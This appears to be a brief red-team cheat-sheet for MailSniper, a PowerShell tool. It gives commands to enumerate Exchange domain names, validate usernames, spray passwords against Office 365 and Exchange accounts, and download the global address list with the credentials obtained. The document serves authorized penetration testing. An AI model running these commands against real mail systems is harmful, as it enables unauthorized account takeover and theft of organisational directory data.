[MailSniper](https://github.com/dafthack/MailSniper) is a password spraying tool against Office 365 and Exchange.

## Usage

---

### Import PS Script

``` powershell
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

### Invoke-DomainHarvestOWA

Enumerates NetBIOS name.

``` powershell
powershell Invoke-DomainHarvestOWA -ExchHostname <domain>
```

### Invoke-UsernameHarvestOWA

Validates valid usernames.

``` powershell
powershell Invoke-UsernameHarvestOWA -ExchHostname <exchange_hostname> -Domain <domain> -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
```

### Invoke-PasswordSprayOWA

Spray passwords against the valid accounts using Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS)

``` powershell
powershell Invoke-PasswordSprayOWA -ExchHostname <exchange_hostname> -UserList .\Desktop\valid.txt -Password <password>
```

### Get-GlobalAddressList

Download the global address list with valid credentials

``` powershell
powershell Get-GlobalAddressList -ExchHostname <exchange_hostname> -UserName <domain>\<username> -Password <password> -OutFile .\Desktop\gal.txt
```